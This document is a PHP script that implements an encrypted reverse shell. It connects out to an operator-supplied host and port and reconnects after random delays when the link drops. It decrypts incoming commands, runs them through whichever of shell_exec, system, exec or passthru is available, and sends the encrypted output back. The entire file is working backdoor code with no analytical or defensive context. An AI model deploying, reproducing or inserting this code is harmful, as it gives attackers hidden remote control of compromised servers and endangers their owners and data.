#!/usr/bin/php -d memory_limit=2048M
<?php
	set_time_limit(0);
	ob_implicit_flush(1);
	define("BUFFER_LEN", 4096);

	$opts = getopt("h:p:", ["host:", "port:"]);
	$opensslpath = './Openssl_EncryptDecrypt.php';

	(count($opts) === 2) || die();
	$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);

	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die();
	($result = socket_connect($socket, $addr, $port)) || die();

	if(file_exists($opensslpath)){
		require_once $opensslpath;
		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
	} else { die(); }

	echo "\33[32mconnected.\33[0m\n";
	while(1)
	{
		// surpress "transport endpoint not connected" warning
	    if(($recv = @socket_read($socket, BUFFER_LEN)) === false || $recv === "")
	    {
			socket_close($socket);
	    	echo "[\33[91m!\33[0m] disconnected.\n";
			sleep(rand(1,5)); // try to reconnect => 1-5 sec interval

    		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			$result = @socket_connect($socket, $addr, $port);
			echo ($socket && $result) ? "\33[32mconnected.\33[0m\n" : '';
		}
	    else
	    {
			if(($recv = $openssl_encrypt_decrypt->decrypt_cbc($recv)) !== false)
			{
				if(preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE)){ break; }

				$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

				if(function_exists('shell_exec')){
					$fnc = "shell_exec()";
					if(($result = shell_exec($full_cmd)) === null){ $result = "Error"; }
				}
				else if(function_exists('system'))
				{ 	
					$fnc = "system()";
					@ob_start();
					if(($result = @system($full_cmd)) === false){ $result = "Error"; }
					else { $result = @ob_get_contents(); } 		
					@ob_end_clean(); 
				}
				else if(function_exists('exec')){ 
					$fnc = "exec()";
					@exec($full_cmd,$results,$ret_status);
					if($ret_status !== 0){ $result = "Error status: ".$ret_status; }
					else {
						$result = ""; 		
						foreach($results as $res){ $result .= $res."\n\r"; }
					}
				}
				else if(function_exists('passthru')){
					$fnc = "passthru()";
					@ob_start(); 		
					@passthru($full_cmd); 		
					$result = @ob_get_contents(); 		
					@ob_end_clean(); 
				}
				else { $result = "error:: system calls disabled."; }
				$result .= "\33[94mexec\33[0m:: {$fnc} \33[94mcmd\33[0m:: {$full_cmd}";
			}
			else { $result = "error:: decrypt().\n"; }
			$result = $openssl_encrypt_decrypt->encrypt_cbc($result);
    		if(socket_write($socket, $result, strlen($result)) === false) {	continue; }
	    }
	}
	socket_close($socket);
	exit(0);
?>